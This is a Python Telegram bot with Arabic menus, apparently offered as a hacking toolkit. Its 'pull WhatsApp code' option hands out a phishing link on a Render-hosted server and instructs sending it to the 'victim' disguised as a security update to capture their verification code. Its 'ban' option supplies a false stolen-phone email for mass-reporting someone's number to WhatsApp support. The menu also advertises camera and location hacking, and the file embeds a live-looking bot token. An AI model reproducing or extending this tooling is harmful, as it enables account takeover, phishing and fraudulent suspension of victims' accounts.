import telebot
from telebot import types
import os
from flask import Flask, request
import threading

TOKEN = '8468154462:AAHkVqMSAqxBQ6iq-TaSYSVH3B-rZkyQKD8'
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# رابط السيرفر على Render
BASE_URL = "https://shadow-core-v2.onrender.com"

def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btns = [
        '💬 سحب كود واتساب', '🚫 حظر رقم واتساب',
        '🔓 فك حظر واتساب', '📸 اختراق الكاميرا',
        '📍 اختراق الموقع', '📂 السيطرة الكاملة',
        '🚫 بلاغات تيك توك', '🚫 بلاغات انستقرام'
    ]
    markup.add(*(types.KeyboardButton(b) for b in btns))
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "💀 **نظام التحكم في واتساب نشط** 💀", reply_markup=main_menu())

@bot.message_handler(func=lambda m: True)
def handle_commands(message):
    if message.text == '💬 سحب كود واتساب':
        msg = f"🔗 **رابط صفحة سحب الكود (OTP):**\n{BASE_URL}/whatsapp\n\n⚠️ أرسله للضحية لإيهامه بتحديث الأمان."
    
    elif message.text == '🚫 حظر رقم واتساب':
        msg = (
            "⚠️ **بند حظر واتساب (قوي):**\n\n"
            "انسخ النص التالي وأرسله من 3 إيميلات مختلفة إلى `support@whatsapp.com`:\n\n"
            "Subject: Urgent: Lost/Stolen account\n"
            "Message: My phone was stolen. Please deactivate my account immediately: [ضع الرقم هنا]"
        )
        
    elif message.text == '🔓 فك حظر واتساب':
        msg = (
            "✅ **رسالة فك الحظر (طلب اعتذار):**\n\n"
            "أرسل هذا النص لدعم واتساب:\n\n"
            "Dear WhatsApp Support, My account was banned by mistake. I didn't violate any terms. Please review and unban: [ضع الرقم هنا]"
        )
    else:
        msg = "⚙️ جاري معالجة طلبك.."
    
    bot.reply_to(message, msg)

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    bot.polling(none_stop=True)
